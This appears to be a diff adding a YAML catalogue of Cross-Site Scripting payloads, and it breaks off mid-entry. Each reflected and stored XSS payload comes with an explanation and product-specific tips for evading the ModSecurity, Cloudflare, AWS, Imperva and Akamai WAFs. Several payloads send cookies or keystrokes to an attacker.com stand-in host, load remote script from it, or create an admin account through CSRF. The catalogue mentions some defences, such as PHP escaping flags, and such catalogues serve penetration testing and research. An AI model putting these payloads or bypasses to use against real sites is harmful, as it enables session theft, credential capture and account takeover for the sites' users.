@@ -1,0 +1,2432 @@
+slug: xss
+name: Cross-Site Scripting (XSS)
+owasp: A03:2021 – Injection
+description: 'Cross-Site Scripting occurs when an attacker injects malicious scripts into web pages viewed by other users.
+  The browser executes the injected script in the context of the vulnerable site, granting the attacker access to session
+  tokens, cookies, and DOM data. XSS can lead to account takeover, credential harvesting, and full client-side compromise.
+
+  '
+severity_range:
+  low: CVSS 4.0-5.9
+  high: CVSS 8.0-9.8
+references:
+- label: OWASP XSS Prevention Cheat Sheet
+  url: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
+- label: PortSwigger XSS Research
+  url: https://portswigger.net/web-security/cross-site-scripting
+- label: OWASP Top 10 A03 Injection
+  url: https://owasp.org/Top10/A03_2021-Injection/
+groups:
+- slug: reflected
+  name: Reflected XSS
+  description: Input is immediately echoed back in the HTTP response without sanitization, executing in the victim's browser
+    when they visit a crafted URL.
+  difficulty: medium
+  prerequisites:
+  - User-controlled input is reflected in HTTP response
+  - No output encoding on the reflection point
+  payloads:
+  - id: xss-ref-001
+    title: Basic script tag alert
+    payload_string: <script>alert(1)</script>
+    how_it_works: 'The browser''s HTML parser encounters the <script> tag and hands control to the JavaScript engine, which
+      immediately executes the enclosed code. Because the script runs in the origin of the vulnerable page, it has full access
+      to that page''s DOM, cookies, and localStorage. An attacker delivers this via a crafted link sent to a victim. Upon
+      click the victim''s session cookies can be exfiltrated to an attacker-controlled server.
+
+      '
+    prerequisites:
+    - Input reflected without HTML encoding
+    waf_bypass_notes: Blocked by most WAFs; use case variation or event handler variants
+    waf_notes_by_product:
+    - waf: ModSecurity CRS
+      blocked: true
+      bypass: CRS rules 941100/941110 (XSS-Libinjection and script-tag) block this; switch to event handler payloads that
+        omit the script keyword entirely
+      alt: xss-ref-002 (img onerror)
+    - waf: Cloudflare WAF
+      blocked: true
+      bypass: ML-based XSS detection; try Unicode normalisation or mixed-case variants (sCrIpT); effectiveness varies by site
+        sensitivity setting
+      alt: xss-ref-010 (case bypass)
+    - waf: AWS WAF (XSS managed ruleset)
+      blocked: true
+      bypass: AWS XSS rule group pattern-matches <script>; HTML entity encoding of angle brackets (&#60;script&#62;) may evade
+        static rules but not all deployments
+      alt: xss-ref-012 (entity encoded)
+    - waf: Imperva (AppTrana / SecureSphere)
+      blocked: true
+      bypass: Imperva ThreatRadar signatures cover script tags; attribute-injection payloads without script keyword are less
+        consistently detected
+      alt: xss-ref-014 (attribute injection)
+    - waf: Akamai Kona Site Defender
+      blocked: true
+      bypass: Akamai KSD rule sets block common XSS patterns; low-frequency HTML5 events (ontoggle, onanimationstart) are
+        less reliably in rule sets
+      alt: xss-ref-006 (details ontoggle)
+    severity_context: CVSS 6.1 – attacker executes JavaScript in victim browser context
+    cve_refs: []
+    tags:
+    - reflected
+    - basic
+    - script-tag
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-ref-002
+    title: Image onerror event
+    payload_string: '"><img src=x onerror=alert(1)>'
+    how_it_works: 'The double-quote breaks out of the enclosing HTML attribute context, closing the prior tag. The injected
+      img tag references a nonexistent image resource ''x'', causing the browser to fire the onerror event handler. This executes
+      arbitrary JavaScript without requiring a script element, bypassing filters that block the word ''script''. The attacker
+      can replace alert(1) with a payload to steal cookies or perform DOM manipulation.
+
+      '
+    prerequisites:
+    - Input reflected inside an HTML attribute or after a tag
+    waf_bypass_notes: Many WAFs miss this; obfuscate 'onerror' with HTML entities if needed. PHP htmlspecialchars() with default
+      ENT_COMPAT flags escapes double-quotes as &quot;, blocking this specific payload in double-quoted attribute contexts
+      — but developers must use ENT_QUOTES to also cover single-quoted attribute contexts, or the variant with a leading single-quote
+      remains exploitable.
+    waf_notes_by_product:
+    - waf: ModSecurity CRS
+      blocked: false
+      bypass: CRS rule 941110 targets the script keyword; img/onerror avoids it. Rule 941160 may catch onerror= but is often
+        disabled due to false positives on legitimate pages
+      alt: No alternative needed — this payload bypasses ModSec CRS by default
+    - waf: Cloudflare WAF
+      blocked: partial
+      bypass: Cloudflare detects common event-handler patterns; use onfocus with autofocus, or ontoggle on a details element,
+        which are lower-frequency in Cloudflare signatures
+      alt: xss-ref-005 (autofocus onfocus)
+    - waf: AWS WAF (XSS managed ruleset)
+      blocked: partial
+      bypass: AWS CrossSiteScripting_BODY rule matches common event handlers; switching to less common events (onpointerover,
+        onanimationstart) may bypass rule matching
+      alt: xss-ref-006 (details ontoggle)
+    - waf: Imperva (AppTrana / SecureSphere)
+      blocked: partial
+      bypass: img/onerror is a well-known pattern; try <video><source onerror=> or <input onfocus autofocus> as less-detected
+        alternatives
+      alt: xss-ref-013 (video source onerror)
+    - waf: Akamai Kona Site Defender
+      blocked: partial
+      bypass: Akamai behavioral detection; space-separated attribute syntax or obfuscating onerror with HTML entities (on&#101;rror)
+        reduces signature match confidence
+      alt: xss-ref-008 (body onpageshow)
+    severity_context: CVSS 6.1 – JavaScript execution in victim browser
+    cve_refs: []
+    tags:
+    - reflected
+    - event-handler
+    - img-tag
+    - attribute-escape
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-ref-003
+    title: SVG onload payload
+    payload_string: <svg onload=alert(1)>
+    how_it_works: 'SVG is an XML-based vector image format that browsers render inline as part of the DOM. The onload event
+      fires as soon as the SVG element is parsed, executing attached JavaScript. This bypasses filters that only block ''script''
+      tags while allowing image tags. SVG payloads are short, reliable across browsers, and particularly useful in contexts
+      where character length is limited.
+
+      '
+    prerequisites:
+    - Input reflected in HTML body context
+    waf_bypass_notes: Try <SVG/onload=alert(1)> or uppercase variants
+    severity_context: CVSS 6.1 – reliable cross-browser XSS execution
+    cve_refs: []
+    tags:
+    - reflected
+    - svg
+    - onload
+    - short-payload
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-ref-004
+    title: Script tag with src
+    payload_string: <script src=//attacker.com/x.js></script>
+    how_it_works: 'Rather than embedding JavaScript inline, this loads an external script from an attacker-controlled server.
+      This allows arbitrarily large payloads and makes detection harder since the malicious code is not present in the reflected
+      response. The attacker can update the remote script dynamically after delivery. SSL-relative URLs (//host) work over
+      both HTTP and HTTPS, maximizing compatibility.
+
+      '
+    prerequisites:
+    - Input reflected without sanitization
+    - CSP does not restrict script-src
+    waf_bypass_notes: Replace with attacker domain; some WAFs block external domains
+    severity_context: CVSS 8.0 – loads arbitrary remote code into victim browser
+    cve_refs: []
+    tags:
+    - reflected
+    - external-script
+    - remote-load
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-ref-005
+    title: Input autofocus onfocus
+    payload_string: <input autofocus onfocus=alert(1)>
+    how_it_works: 'The autofocus attribute causes the browser to automatically focus the input element immediately upon page
+      load without any user interaction. This triggers the onfocus event handler, executing the attached JavaScript. This
+      technique is valuable in contexts where onload or onerror may be filtered because it uses a less-commonly blocked event.
+      It requires no user interaction beyond loading the page, making it fully reliable.
+
+      '
+    prerequisites:
+    - Input reflected in HTML body context
+    waf_bypass_notes: Use tabindex=1 autofocus as alternative trigger
+    severity_context: CVSS 6.1 – no user interaction required beyond page load
+    cve_refs: []
+    tags:
+    - reflected
+    - autofocus
+    - onfocus
+    - no-interaction
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-ref-006
+    title: Details ontoggle
+    payload_string: <details open ontoggle=alert(1)>
+    how_it_works: 'The HTML5 details element, when opened, fires an ontoggle event. Combining the ''open'' attribute with
+      the ontoggle handler triggers execution automatically without user interaction. This is a relatively novel vector that
+      many WAF signatures do not cover. It works in all modern browsers and is particularly useful when common event handlers
+      like onload or onerror are being filtered.
+
+      '
+    prerequisites:
+    - Input reflected in HTML body context
+    - Browser supports HTML5 details element
+    waf_bypass_notes: Rarely blocked; reliable bypass for legacy WAF rulesets
+    severity_context: CVSS 6.1 – browser-native HTML5 XSS vector
+    cve_refs: []
+    tags:
+    - reflected
+    - html5
+    - ontoggle
+    - waf-bypass
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-ref-007
+    title: Anchor href javascript URI
+    payload_string: <a href=javascript:alert(1)>click</a>
+    how_it_works: 'The javascript: URI scheme executes JavaScript when the link is clicked. The browser evaluates the URI
+      as a JavaScript expression in the current page context. This requires a user click, making it a user-interaction-required
+      XSS. It is commonly effective in applications that allow HTML in user-supplied content such as comments or profile fields.
+      Attackers typically disguise the link text to encourage clicks.
+
+      '
+    prerequisites:
+    - 'href attribute accepts javascript: URIs'
+    - User interaction (click) required
+    waf_bypass_notes: 'Use &#106;avascript: or java&#9;script: to bypass string matching. PHP htmlspecialchars() applied to
+      an href value will escape angle brackets and quotes but does NOT strip the javascript: protocol from a URL — attackers
+      inject javascript: without any characters that htmlspecialchars() targets; defense requires explicit protocol allowlisting
+      (e.g., filter_var with FILTER_VALIDATE_URL) or strip_tags() is also insufficient since this payload is an attribute
+      value, not a tag.'
+    severity_context: CVSS 5.4 – requires user click
+    cve_refs: []
+    tags:
+    - reflected
+    - javascript-uri
+    - href
+    - user-interaction
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-ref-008
+    title: Body onpageshow
+    payload_string: <body onpageshow=alert(1)>
+    how_it_works: 'The onpageshow event fires when a page is shown, including when navigating back to a cached page from the
+      browser''s back-forward cache (bfcache). This is a less commonly filtered event compared to onload. In some cases it
+      can trigger twice: once on initial load and once when the user returns via back navigation. It provides reliable execution
+      in body tag injection contexts.
+
+      '
+    prerequisites:
+    - Input injected into or near a body tag context
+    waf_bypass_notes: onpageshow is rarely in WAF signatures; effective bypass
+    severity_context: CVSS 6.1 – executes on page load and bfcache restore
+    cve_refs: []
+    tags:
+    - reflected
+    - body-tag
+    - onpageshow
+    - bfcache
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-ref-009
+    title: Marquee onstart
+    payload_string: <marquee onstart=alert(1)>
+    how_it_works: 'The marquee element is an obsolete HTML element still supported by most browsers for backwards compatibility.
+      The onstart event fires when the marquee animation begins, which happens automatically without user interaction. Because
+      it is a legacy element, many WAF signatures do not include it. This is a reliable fallback when common elements are
+      blocked.
+
+      '
+    prerequisites:
+    - Input reflected in HTML body context
+    - Browser renders marquee element (all major browsers do)
+    waf_bypass_notes: Legacy element often missed by WAFs; reliable low-detection payload
+    severity_context: CVSS 6.1 – auto-executing legacy element XSS
+    cve_refs: []
+    tags:
+    - reflected
+    - marquee
+    - legacy-element
+    - waf-bypass
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-ref-010
+    title: Script tag case bypass
+    payload_string: <ScRiPt>alert(1)</ScRiPt>
+    how_it_works: 'HTML tag names are case-insensitive in HTML5. Browsers normalize tag names during parsing, so any case
+      combination of ''script'' will execute as a script tag. This bypasses naive string matching filters that only check
+      for lowercase ''script''. Mixed case does not affect browser execution but defeats simple keyword blocklists and some
+      WAF rules.
+
+      '
+    prerequisites:
+    - Filter uses case-sensitive matching for 'script'
+    waf_bypass_notes: Bypasses simple case-sensitive filters; modern WAFs handle case folding
+    waf_notes_by_product:
+    - waf: ModSecurity CRS
+      blocked: true
+      bypass: CRS rules are case-insensitive (t:lowercase transform applied before matching); this does NOT bypass ModSec
+        CRS — use a different evasion technique
+      alt: xss-ref-002 (event handler, avoids script keyword)
+    - waf: Cloudflare WAF
+      blocked: true
+      bypass: Cloudflare normalises case before matching; this payload is reliably detected. Target encoding or attribute
+        injection instead
+      alt: xss-ref-014 (attribute injection)
+    - waf: AWS WAF (XSS managed ruleset)
+      blocked: partial
+      bypass: AWS rule group applies case folding; effectiveness depends on how quickly AWS pushes rule updates. Use event-handler
+        payloads as fallback
+      alt: xss-ref-005 (autofocus onfocus)
+    - waf: Imperva (AppTrana / SecureSphere)
+      blocked: partial
+      bypass: Imperva normalises case; combining case variation with URL encoding (%53cript) may defeat older signature versions
+      alt: xss-ref-011 (double URL encoded)
+    - waf: Akamai Kona Site Defender
+      blocked: partial
+      bypass: Akamai applies case folding in most rule groups; mixed with null bytes or HTML comments between letters may
+        reduce rule confidence in some configurations
+      alt: xss-ref-003 (SVG onload, no script keyword)
+    severity_context: CVSS 6.1 – filter bypass technique
+    cve_refs: []
+    tags:
+    - reflected
+    - case-bypass
+    - script-tag
+    - filter-evasion
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-ref-011
+    title: Double URL encoded script tag
+    payload_string: '%253Cscript%253Ealert(1)%253C%252Fscript%253E'
+    how_it_works: 'Double URL encoding represents characters as percent-encoded sequences where the percent sign itself is
+      also encoded (%25 = %). If the application performs URL decoding once server-side and then reflects the result, a second
+      decoding by the browser produces the raw script tag. This is effective against filters that decode input once before
+      checking it. The server must be performing URL decoding and then reflecting without re-encoding.
+
+      '
+    prerequisites:
+    - Server performs single URL decode then reflects
+    - Browser performs second decode
+    waf_bypass_notes: Effective against WAFs that decode once; some normalize before matching. PHP applications that call
+      urldecode() or rawurldecode() before applying htmlspecialchars() or strip_tags() will sanitize the percent-encoded form,
+      not the decoded result; htmlspecialchars() with ENT_QUOTES must be applied after all decoding steps, not before, to
+      prevent double-encoded payloads from surviving the filter chain.
+    severity_context: CVSS 6.1 – double-decode filter bypass
+    cve_refs: []
+    tags:
+    - reflected
+    - double-encoding
+    - url-encode
+    - filter-evasion
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-ref-012
+    title: HTML entity encoded script
+    payload_string: '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;'
+    how_it_works: 'HTML entity encoding represents characters as their hexadecimal Unicode code point equivalents. If the
+      application outputs user data into a context where the browser performs HTML entity decoding before execution (such
+      as within certain attribute values or innerHTML assignments), these entities expand to the raw characters. This bypasses
+      filters that scan for literal angle brackets or the string ''script''.
+
+      '
+    prerequisites:
+    - Application reflects HTML entities without re-encoding
+    - Browser decodes entities in the reflection context
+    waf_bypass_notes: Works when WAF scans raw input but app decodes entities before use. PHP applications that call html_entity_decode()
+      or htmlspecialchars_decode() on stored content before re-displaying it can expand these entities back to executable
+      form; htmlspecialchars() with ENT_QUOTES must be the final encoding step at output time, not applied at input time,
+      to neutralise entity-encoded payloads stored in the database.
+    severity_context: CVSS 6.1 – entity encoding filter bypass
+    cve_refs: []
+    tags:
+    - reflected
+    - html-entities
+    - encoding-bypass
+    - filter-evasion
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-ref-013
+    title: Video poster onerror
+    payload_string: <video><source onerror=alert(1)></video>
+    how_it_works: 'The video element''s nested source tag fires an onerror event when the media source fails to load. Since
+      no valid source is provided, the error fires immediately. This technique uses a less common element/event combination
+      that many WAF signatures overlook. The video and source elements are standard HTML5 and supported in all modern browsers,
+      making this a highly compatible alternative vector.
+
+      '
+    prerequisites:
+    - Input reflected in HTML body context
+    waf_bypass_notes: video/source combination rarely in WAF signatures
+    severity_context: CVSS 6.1 – HTML5 media element XSS
+    cve_refs: []
+    tags:
+    - reflected
+    - video-tag
+    - onerror
+    - html5
+    - waf-bypass
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-ref-014
+    title: Attribute injection with closing quote
+    payload_string: ''' onmouseover=''alert(1)'
+    how_it_works: 'When input is reflected inside a single-quoted HTML attribute value, the leading apostrophe closes the
+      attribute value and the injected event handler becomes a new attribute on the same element. Moving the mouse over any
+      part of the element triggers the payload. This technique is effective when the reflection point is inside a single-quoted
+      attribute like src='''' or value=''''. The trailing apostrophe closes the injected attribute cleanly.
+
+      '
+    prerequisites:
+    - Input reflected inside single-quoted HTML attribute
+    waf_bypass_notes: Quote type must match reflection context; try both single and double. PHP htmlspecialchars() with its
+      default ENT_COMPAT flag does NOT escape single quotes (apostrophes), leaving single-quoted attribute contexts fully
+      vulnerable to this vector; developers must pass ENT_QUOTES (or ENT_HTML5) as the second argument, or additionally apply
+      addslashes(), to prevent single-quote attribute injection in PHP applications.
+    waf_notes_by_product:
+    - waf: ModSecurity CRS
+      blocked: false
+      bypass: CRS does not have a specific rule blocking single-quote attribute escape followed by an event handler — the
+        pattern avoids script keywords and stays within existing attribute context. Rule 941160 (no-script-name XSS) may not
+        trigger
+      alt: No alternative needed — ModSec CRS typically does not block this vector
+    - waf: Cloudflare WAF
+      blocked: partial
+      bypass: Cloudflare ML may detect onmouseover in attribute context; substitute with onfocus and add autofocus attribute,
+        or use ontouchstart on mobile-targeted tests
+      alt: xss-ref-005 (autofocus onfocus, no mouse interaction required)
+    - waf: AWS WAF (XSS managed ruleset)
+      blocked: partial
+      bypass: AWS XSS rule group matches common event handlers in attribute position; try onpointerenter or onanimationend
+        which appear in fewer WAF signatures
+      alt: xss-ref-008 (body onpageshow)
+    - waf: Imperva (AppTrana / SecureSphere)
+      blocked: partial
+      bypass: Imperva may catch attribute-escape patterns; URL-encode the single quote (%27 onmouseover=) or use double-quote
+        variant if the reflection is inside a double-quoted attribute
+      alt: xss-ref-002 (double-quote break, onerror)
+    - waf: Akamai Kona Site Defender
+      blocked: false
+      bypass: Akamai KSD less frequently blocks attribute-escape-based event handlers without script keyword; this payload
+        may pass through depending on protection level configured
+      alt: No bypass needed at default KSD protection level
+    severity_context: CVSS 5.4 – requires mouse interaction
+    cve_refs: []
+    tags:
+    - reflected
+    - attribute-injection
+    - event-handler
+    - single-quote
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-ref-015
+    title: Iframe srcdoc payload
+    payload_string: <iframe srcdoc='<script>alert(1)</script>'>
+    how_it_works: 'The iframe srcdoc attribute allows specifying the HTML content of the iframe as an inline string. The browser
+      parses and renders this HTML as a complete document within the iframe. Scripts in the srcdoc execute in a context that
+      inherits the parent''s origin, giving them access to the parent page''s cookies and localStorage. This is an effective
+      bypass when script tags in the main body are filtered but iframe attributes are not scrutinized.
+
+      '
+    prerequisites:
+    - Input reflected in HTML body context
+    - iframe tag not blocked
+    waf_bypass_notes: srcdoc attribute is often missed; combine with HTML encoding for bypass
+    severity_context: CVSS 6.1 – inherits parent origin for cookie access
+    cve_refs: []
+    tags:
+    - reflected
+    - iframe
+    - srcdoc
+    - waf-bypass
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-ref-016
+    title: Object data javascript URI
+    payload_string: <object data=javascript:alert(1)>
+    how_it_works: 'The object element''s data attribute, like anchor href, accepts javascript: URIs in some browser/context
+      combinations. When rendered, the browser evaluates the URI as JavaScript. This is an older technique but remains in
+      WAF bypass collections because it uses an element type that many automated filters do not associate with script execution.
+      Browser support varies; Internet Explorer and older Chrome versions were particularly vulnerable.
+
+      '
+    prerequisites:
+    - 'Browser evaluates javascript: URIs in object data attribute'
+    - object element not blocked
+    waf_bypass_notes: Browser support varies; test in target environment
+    severity_context: CVSS 5.4 – browser-dependent execution
+    cve_refs: []
+    tags:
+    - reflected
+    - object-tag
+    - javascript-uri
+    - legacy
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-ref-017
+    title: Base tag injection
+    payload_string: <base href=//attacker.com>
+    how_it_works: 'Injecting a base tag changes the base URL for all relative links and resources on the page. After injection,
+      any relative script src, link href, or form action resolves against the attacker''s domain. If the page loads any scripts
+      using relative URLs after the injected base tag in the DOM, those scripts are fetched from the attacker''s server. This
+      can lead to JavaScript execution without any direct XSS payload visible in the URL.
+
+      '
+    prerequisites:
+    - Page loads relative-path resources after the injection point
+    - Injection point is early in the document
+    waf_bypass_notes: No JavaScript in payload; often bypasses XSS filters entirely
+    severity_context: CVSS 7.4 – hijacks all relative resource loads on the page
+    cve_refs: []
+    tags:
+    - reflected
+    - base-tag
+    - resource-hijack
+    - indirect-xss
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+- slug: stored
+  name: Stored XSS
+  description: Malicious script is persisted in the application's data store and delivered to every user who views the affected
+    content.
+  difficulty: high
+  prerequisites:
+  - Application stores and re-renders user-supplied HTML or script
+  - No sanitization on storage or output
+  payloads:
+  - id: xss-sto-001
+    title: Script tag in comment field
+    payload_string: <script>document.location='https://attacker.com/steal?c='+document.cookie</script>
+    how_it_works: 'This payload stores a script tag in a persisted field such as a comment, profile bio, or post. Every subsequent
+      user who loads the page containing this content triggers the script. The script redirects to an attacker-controlled
+      URL appending the victim''s cookies as a query parameter. Unlike reflected XSS, stored XSS does not require the attacker
+      to social-engineer a victim into clicking a link — it affects all visitors automatically.
+
+      '
+    prerequisites:
+    - Application persists HTML in database and renders without encoding
+    - Cookie not protected by HttpOnly flag
+    waf_bypass_notes: WAF may inspect POST body; encode payload or use multipart upload. PHP applications often defend stored
+      XSS by applying htmlspecialchars() on output, but this htmlspecialchars bypass succeeds whenever the function is omitted
+      on a stored script rendering path — for example, developers calling htmlspecialchars without the ENT_QUOTES flag still
+      allow stored script injection via single-quoted attributes, and any output that uses innerHTML or eval sidesteps htmlspecialchars
+      entirely, allowing alert(1) or cookie-theft XSS payloads to execute from stored content.
+    waf_notes_by_product:
+    - waf: ModSecurity CRS
+      blocked: partial
+      bypass: CRS inspects request body (POST) but not database reads; stored XSS payloads already persisted bypass CRS entirely
+        at render time because CRS has no response-body scanning by default
+      alt: Store any XSS variant — ModSec CRS cannot block stored content on egress without response inspection enabled
+    - waf: Cloudflare WAF
+      blocked: partial
+      bypass: Cloudflare inspects POST bodies and may block obvious script tags on write; payloads can be split across multiple
+        write operations or stored base64-encoded and decoded on render
+      alt: xss-sto-006 (JSON injection rendered via innerHTML — write path doesn't look like XSS)
+    - waf: AWS WAF (XSS managed ruleset)
+      blocked: partial
+      bypass: AWS WAF inspects HTTP request bodies; does not scan application responses. Once stored, the payload executes
+        freely. Obfuscate the write request to avoid input-time blocking
+      alt: Use multipart upload or chunked encoding to defeat AWS WAF body inspection on write
+    - waf: Imperva (AppTrana / SecureSphere)
+      blocked: partial
+      bypass: Imperva inspects writes; response-body scanning (virtual patching) can catch stored XSS on reads if configured.
+        Standard deployment blocks write but not render
+      alt: xss-sto-008 (mXSS mutation bypass — sanitiser-bypass technique effective if Imperva relies on server-side sanitisation)
+    - waf: Akamai Kona Site Defender
+      blocked: partial
+      bypass: Akamai KSD applies client-side caching rules; stored XSS payloads in user-specific pages (not CDN-cached) are
+        not inspected at render time. Block write via obfuscation
+      alt: xss-sto-014 (template literal injection — less signature coverage in Akamai rule sets)
+    severity_context: CVSS 8.8 – persistent cookie theft from all page visitors
+    cve_refs:
+    - CVE-2020-11023
+    tags:
+    - stored
+    - cookie-theft
+    - persistent
+    - exfiltration
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-sto-002
+    title: SVG file upload XSS
+    payload_string: <svg xmlns='http://www.w3.org/2000/svg'><script>alert(document.domain)</script></svg>
+    how_it_works: 'SVG files are XML-based and support embedded script elements. When a user uploads an SVG file and the server
+      serves it with Content-Type: image/svg+xml (or text/html), the browser executes any embedded scripts in the context
+      of the serving origin. This is a stored XSS vector through file uploads. Many upload endpoints check file extensions
+      but serve SVG files directly, making this a common misconfiguration. The payload reveals the vulnerable domain via the
+      domain property.
+
+      '
+    prerequisites:
+    - Application allows SVG file upload
+    - SVG served with image/svg+xml or text/html content type from same origin
+    waf_bypass_notes: Rename to .svg; some filters check content-type only
+    severity_context: CVSS 8.8 – persistent XSS via stored file
+    cve_refs: []
+    tags:
+    - stored
+    - svg-upload
+    - file-upload
+    - persistent
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-sto-003
+    title: IMG onerror in profile field
+    payload_string: <img src=x onerror="fetch('https://attacker.com/?c='+btoa(document.cookie))">
+    how_it_works: 'Stored in a profile or bio field, this payload fires the onerror event on every page load where the profile
+      is displayed. It uses the Fetch API to make an out-of-band HTTP request to an attacker server, base64-encoding the cookie
+      to avoid URL encoding issues. btoa() handles encoding, making the exfiltration more reliable than simple concatenation.
+      This approach works even when the HttpOnly flag is not set on session cookies.
+
+      '
+    prerequisites:
+    - Profile/bio field reflects HTML without encoding
+    - Cookies not HttpOnly
+    - CSP does not block fetch to external origins
+    waf_bypass_notes: Use fetch() instead of document.location to avoid obvious redirect
+    severity_context: CVSS 8.8 – silent cookie exfiltration via stored payload
+    cve_refs:
+    - CVE-2020-11022
+    tags:
+    - stored
+    - oob-exfiltration
+    - fetch-api
+    - persistent
+    - cookie-theft
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-sto-004
+    title: Keylogger via stored XSS
+    payload_string: <script>document.addEventListener('keypress',function(e){fetch('https://attacker.com/log?k='+e.key)})</script>
+    how_it_works: 'This payload installs a persistent keylogger on the page by attaching a keypress event listener to the
+      entire document. Each keypress sends the pressed key to the attacker''s server via a fetch request. When stored in a
+      page containing login forms or sensitive inputs, this captures credentials in real time. The listener persists for the
+      lifetime of the page and captures data from all input fields including password fields.
+
+      '
+    prerequisites:
+    - Payload stored and reflected without encoding
+    - CSP does not block external fetch
+    waf_bypass_notes: Obfuscate addEventListener with string concatenation to evade WAF
+    severity_context: CVSS 9.3 – real-time credential capture from all users
+    cve_refs: []
+    tags:
+    - stored
+    - keylogger
+    - credential-capture
+    - persistent
+    - advanced
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-sto-005
+    title: CSRF via stored XSS
+    payload_string: <script>fetch('/api/admin/add-user',{method:'POST',body:JSON.stringify({user:'attacker',role:'admin'}),headers:{'Content-Type':'application/json'},credentials:'include'})</script>
+    how_it_works: 'Stored XSS can be chained with CSRF to perform authenticated actions on behalf of any user who views the
+      page. The script makes a same-origin fetch with credentials included, forwarding the victim''s session cookies automatically.
+      This bypasses CSRF tokens if they are embedded in the DOM (readable via JavaScript). This payload demonstrates privilege
+      escalation — creating an admin user — but any authenticated endpoint is reachable.
+
+      '
+    prerequisites:
+    - Stored XSS exists on a page viewed by privileged users
+    - Target API accessible from victim browser origin
+    waf_bypass_notes: Payload is all JavaScript; WAFs focused on HTML tags may miss this
+    severity_context: CVSS 9.3 – admin account creation via XSS+CSRF chain
+    cve_refs: []
+    tags:
+    - stored
+    - csrf-chain
+    - privilege-escalation
+    - api-abuse
+    - advanced
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-sto-006
+    title: Stored XSS in JSON response rendered via innerHTML
+    payload_string: '"</script><script>alert(1)</script>'
+    how_it_works: 'When JSON API responses are embedded directly into page HTML using script tags with type application/json,
+      an attacker who controls stored data can break out of the JSON context. The </script> sequence terminates any enclosing
+      script block, after which a new script tag executes attacker-controlled JavaScript. This is a parser-confusion attack
+      that exploits the difference between how the HTML and JSON parsers handle the same bytes.
+
+      '
+    prerequisites:
+    - JSON data from database embedded in HTML via script tag
+    - User-supplied data not escaped in JSON output
+    waf_bypass_notes: Target is the JSON output layer; input may bypass WAF at write time
+    severity_context: CVSS 8.8 – parser confusion attack breaking out of JSON block
+    cve_refs:
+    - CVE-2020-11022
+    tags:
+    - stored
+    - json-injection
+    - parser-confusion
+    - script-break-out
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-sto-007
+    title: HTML injection in markdown renderer
+    payload_string: '[click me](javascript:alert(1))'
+    how_it_works: 'Many markdown renderers allow inline HTML or convert markdown link syntax to anchor tags without sanitizing
+      the href value. If the renderer does not block javascript: scheme URIs, the rendered anchor tag executes JavaScript
+      on click. This is a stored XSS via markdown injection, common in wiki platforms, issue trackers, and documentation systems.
+      The attack surface is significant because markdown is widely used for user content.
+
+      '
+    prerequisites:
+    - Markdown renderer outputs raw href without sanitization
+    - User clicks the rendered link
+    waf_bypass_notes: 'Use java&#x0A;script: or vbscript: as alternative schemes'
+    severity_context: CVSS 6.1 – requires user click; persistent in rendered pages
+    cve_refs: []
+    tags:
+    - stored
+    - markdown
+    - javascript-uri
+    - href-injection
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-sto-008
+    title: Mutation XSS in stored rich text
+    payload_string: <noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>
+    how_it_works: 'This is a mutation XSS (mXSS) payload that exploits the difference between the server''s HTML sanitizer
+      and the browser''s DOM parser. The sanitizer may parse the noscript block as containing safe text, but the browser''s
+      parser, when noscript is in a specific mode, re-parses the content differently. The injected closing noscript tag followed
+      by the img onerror executes JavaScript. mXSS bypasses even well-known sanitizers like DOMPurify in certain configurations.
+
+      '
+    prerequisites:
+    - Sanitizer and browser parser disagree on noscript handling
+    - noscript element not removed by sanitizer
+    waf_bypass_notes: Specific to browser/sanitizer combinations; test against DOMPurify
+    severity_context: CVSS 8.8 – bypasses HTML sanitizers via mutation
+    cve_refs:
+    - CVE-2020-26870
+    tags:
+    - stored
+    - mxss
+    - sanitizer-bypass
+    - mutation
+    - advanced
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-sto-009
+    title: Style tag with expression (IE)
+    payload_string: <style>body{background:url('javascript:alert(1)')}</style>
+    how_it_works: 'In older versions of Internet Explorer, CSS expressions and url() values in style attributes could execute
+      JavaScript. The style tag is less commonly filtered than script tags, making this a useful bypass in legacy environments.
+      Modern browsers do not support JavaScript in CSS url() values, so this is primarily relevant for IE-targeted attacks
+      or when assessing older enterprise applications with IE compatibility requirements.
+
+      '
+    prerequisites:
+    - Target uses Internet Explorer or legacy Trident engine
+    - style tag not filtered
+    waf_bypass_notes: IE-specific; not applicable to modern browsers
+    severity_context: CVSS 5.4 – legacy browser XSS via CSS expression
+    cve_refs: []
+    tags:
+    - stored
+    - css-injection
+    - ie-specific
+    - legacy
+    - style-tag
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-sto-010
+    title: DOM clobbering via stored anchor
+    payload_string: <a id=x href=javascript:alert(1)></a>
+    how_it_works: 'DOM clobbering exploits the fact that browsers create global variables for elements with id attributes.
